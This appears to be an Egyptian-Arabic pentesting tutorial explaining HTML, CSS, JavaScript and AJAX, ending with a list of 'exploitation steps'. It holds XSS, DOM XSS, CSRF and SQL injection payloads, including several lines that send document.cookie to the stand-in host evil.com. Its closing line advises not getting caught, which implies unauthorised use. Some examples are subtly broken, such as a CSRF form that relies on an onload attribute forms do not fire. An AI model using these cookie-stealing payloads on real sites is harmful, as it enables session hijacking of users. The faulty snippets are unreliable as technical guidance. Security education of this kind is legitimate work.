تمام، هنشرح **مكونات تطبيقات الويب: تقنيات جانب العميل (Client-Side Technologies - HTML, CSS, JavaScript, AJAX)** بنفس الطريقة السابقة: شرح مفصل وعملي مع أكواد وأوامر، مع تركيز على اختبار الاختراق (Pentesting)، وبعد كل جزء هخلّص بالعامية المصرية، وفي الآخر هقدم خطوات عملية للاستغلال.

---

### **1. شرح تقنيات جانب العميل بالتفصيل:**

#### **أ. المفهوم الأساسي (What Are Client-Side Technologies):**
- تقنيات جانب العميل هي اللي بتشتغل في المتصفح بتاعك (الـ Client)، مش على السيرفر. بتتحكم في اللي بتشوفه وتتفاعل معاه:
  - **HTML:** الهيكل (زي العنوان والفقرات).
  - **CSS:** الشكل (الألوان والتنسيق).
  - **JavaScript:** التفاعل (الأكشن لما تضغط زرار).
  - **AJAX:** بيجيب بيانات من السيرفر بدون تحديث الصفحة.
- الكود بيتروح من السيرفر للمتصفح، وبعد كده المتصفح هو اللي بينفذه.

- **مثال عملي:**
  - صفحة بسيطة:
    ```
    <html>
    <head><style>body {color: blue;}</style></head>
    <body><h1>Hello</h1><script>alert('Hi');</script></body>
    </html>
    ```

- **جانب عملي للبينتست:**
  - شوف الكود:
    - كليك يمين > "View Page Source" (HTML/CSS/JS).
  - جرب تتفاعل:
    - افتح Console في المتصفح (F12) وجرب `document.cookie` (تشوف الكوكيز).

- **خلاصة بالعامية:**
  - "التقنيات دي زي اللي بتشوفها قدامك في الموقع، HTML هو العضم، CSS هو اللحم، وJavaScript هو الروح، لو لعبت فيهم هتعمل عمايل."

---

#### **ب. التقنيات ودورها (Technologies & Roles):**

1. **HTML (HyperText Markup Language):**
   - بيحدد هيكل الصفحة (عناوين، أزرار، حقول إدخال).
   - مثال:
     ```
     <form action="/login" method="POST">
       <input name="username">
       <input name="password" type="password">
       <button>Login</button>
     </form>
     ```

2. **CSS (Cascading Style Sheets):**
   - بيظبط الشكل (ألوان، خطوط، تنسيق).
   - مثال:
     ```
     <style>
       button {background-color: green; padding: 10px;}
     </style>
     ```

3. **JavaScript (JS):**
   - بيضيف التفاعل (زي فتح نافذة أو إرسال طلب).
   - مثال:
     ```
     <script>
       document.querySelector('button').onclick = () => alert('Clicked!');
     </script>
     ```

4. **AJAX (Asynchronous JavaScript and XML):**
   - بيجيب بيانات من السيرفر بدون تحديث.
   - مثال:
     ```
     <script>
       fetch('/api/data')
         .then(response => response.json())
         .then(data => console.log(data));
     </script>
     ```

- **جانب عملي للبينتست:**
  - HTML: جرب حقن: `<input value="<script>alert(1)</script>">` (XSS).
  - CSS: نادرًا في ثغرات، لكن ممكن تستخدمها لتخبية هجمات.
  - JS: افتح Console وجرب: `document.location='http://evil.com?cookie='+document.cookie` (سرقة كوكيز).
  - AJAX: اعترض الطلب بـ Burp Suite وحقن `');alert(1);//` (XSS).

- **خلاصة بالعامية:**
  - "HTML بيبني البيت، CSS بيدهنه، JS بيخليه يتحرك، وAJAX بيجيبلك الأكل من المطبخ من غير ما تقوم، لو كسرتهم هتتحكم في كل حاجة."

---

#### **ج. كيف تشتغل مع بعض (How They Work Together):**
- HTML بيبني الهيكل، CSS بيجمّله، JS بيديله حياة، وAJAX بيربطه بالسيرفر.
- مثال كامل:
  ```
  <html>
  <head>
    <style>.result {color: red;}</style>
  </head>
  <body>
    <input id="search" placeholder="Search">
    <button onclick="search()">Go</button>
    <div class="result" id="result"></div>
    <script>
      function search() {
        let query = document.getElementById('search').value;
        fetch('/api/search?q=' + query)
          .then(res => res.text())
          .then(data => document.getElementById('result').innerHTML = data);
      }
    </script>
  </body>
  </html>
  ```

- **جانب عملي للبينتست:**
  - HTML: جرب `<img src=x onerror=alert(1)>` في حقل البحث (XSS).
  - JS: عدل الكود في Console: `search = () => alert(document.cookie)` (تسريب).
  - AJAX: أضف `');DROP TABLE users;//` في `query` (SQLi لو السيرفر ضعيف).

- **خلاصة بالعامية:**
  - "التلاتة دول زي فرقة موسيقى، لو عزفوا غلط أو حد لعب في الآلات، هتسمع صوت يوديك في داهية."

---

#### **د. الثغرات المرتبطة (Vulnerabilities):**
- **XSS (Cross-Site Scripting):** لو HTML/JS بيسمح بحقن كود.
- **DOM-Based XSS:** لو JS بيستخدم بيانات غير نظيفة (مثل `innerHTML`).
- **CSRF:** لو AJAX بيبعت طلبات بدون حماية.
- **Sensitive Data Exposure:** لو JS بيكشف كوكيز أو بيانات.

- **مثال عملي:**
  - XSS: `<script>fetch('http://evil.com?data='+document.cookie)</script>`.
  - DOM XSS: `document.write(location.hash)` مع `#<img src=x onerror=alert(1)>`.

- **جانب عملي للبينتست:**
  - XSS: جرب في أي إدخال: `<script>alert(1)</script>` أو `<img src=x onerror=alert(1)>`.
  - DOM XSS: غيّر URL: `http://example.com/#<script>alert(1)</script>`.
  - AJAX: اعترض بـ Burp وأضف `');alert(1);//` (XSS أو SQLi).
  - كوكيز: `curl http://example.com | grep cookie` (شوف لو بتظهر في JS).

- **خلاصة بالعامية:**
  - "التقنيات دي لو مش محمية هتبقى زي البيت بدون قفل، أي حد يحط حاجة فيها أو يسرق منها، العب صح وهتكسب."

---

### **خطوات عملية للاستغلال (Pentesting):**
1. **اكتشف الكود:**
   - افتح "View Source" أو `curl http://example.com` (شوف HTML/CSS/JS).
   - ابحث عن JS خارجي: `curl http://example.com/script.js`.

2. **اختبر HTML:**
   - حقن XSS: `<script>alert(document.cookie)</script>` في أي حقل.
   - جرب أخطاء: `<input value=">alert(1)">`.

3. **هاجم JavaScript:**
   - Console: `document.location='http://evil.com?data='+document.cookie`.
   - ابحث عن `eval()` أو `innerHTML` وحقن كود.

4. **استغل AJAX:**
   - اعترض بـ Burp وحقن: `');alert(1);//`.
   - جرب CSRF: `<form action="http://example.com/api" method="POST" onload="submit()">`.

5. **تحلل الثغرات:**
   - XSS: استخدم `xsser` أو يدويًا بـ `<img src=x onerror=alert(1)>`.
   - DOM XSS: `http://example.com/#<script>fetch('evil.com')</script>`.

---

### **خلاصة نهائية بالعامية:**
- "تقنيات الـ Client زي الواجهة بتاعتك، لو عرفت تلعب في HTML وCSS وJS وAJAX، هتخلّي المتصفح يعمل اللي إنت عايزه، بس خلّيك دماغ عشان متتلبسش!"